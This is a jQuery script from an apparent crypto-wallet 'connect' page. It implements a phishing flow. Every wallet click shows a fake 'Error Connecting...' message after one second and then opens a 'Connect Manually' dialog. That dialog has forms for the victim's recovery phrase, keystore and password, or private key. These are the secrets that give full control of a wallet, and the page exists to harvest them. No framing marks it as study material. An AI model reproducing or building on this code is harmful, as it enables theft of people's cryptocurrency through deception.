    <script>
        $(document).ready(function() {
            // Search functionality
            $("#searchInput").on("input", function() {
                const input = $(this).val().toLowerCase();
                $(".coin").each(function() {
                    const name = $(this).find("h4").text().toLowerCase();
                    $(this).toggle(name.includes(input));
                });
            });

            // Wallet connection
            $(".coin").on("click", function() {
                const img = $(this).find(".coin-img").attr("src");
                const name = $(this).find("h4").text().trim();

                $("#current-wallet-logo").attr("src", img);
                $("#current-wallet-app").text(name);
                $(".connection-info").text("Initializing...");
                $("#connect-dialog").show();

                setTimeout(function() {
                    $(".connection-info").html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
                }, 1000);
            });

            // Manual connection
            $(document).on("click", ".manual-connection", function() {
                $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
                $("#current-wallet-app-send").text($("#current-wallet-app").text());
                $("#walletNameData").val($("#current-wallet-app").text());
                $("#connect-dialog").hide();
                $("#send-dialog").show();
            });

            // Tab switching
            $("#phraseSend").click(function() {
                $("#data-to-send").html('<input type="hidden" name="type" value="phrase"><textarea name="phrase" required class="form-control" rows="5" placeholder="Enter your recovery phrase"></textarea><small>Typically 12 (sometimes 24) words separated by single spaces</small>');
            });

            $("#keystoreSend").click(function() {
                $("#data-to-send").html('<input type="hidden" name="type" value="keystore"><textarea name="keystore" required class="form-control" rows="5" placeholder="Enter Keystore"></textarea><input type="text" name="password" required class="form-control" placeholder="Wallet password"><small>Several lines of text beginning with "{...}" plus password</small>');
            });

            $("#privateKeySend").click(function() {
                $("#data-to-send").html('<input type="hidden" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"><small>Typically 12 (sometimes 24) words separated by single spaces</small>');
            });

            // Dialog dismiss
            $(".dialog-dismiss").click(function() {
                $("#connect-dialog, #send-dialog").hide();
            });
        });
    </script>
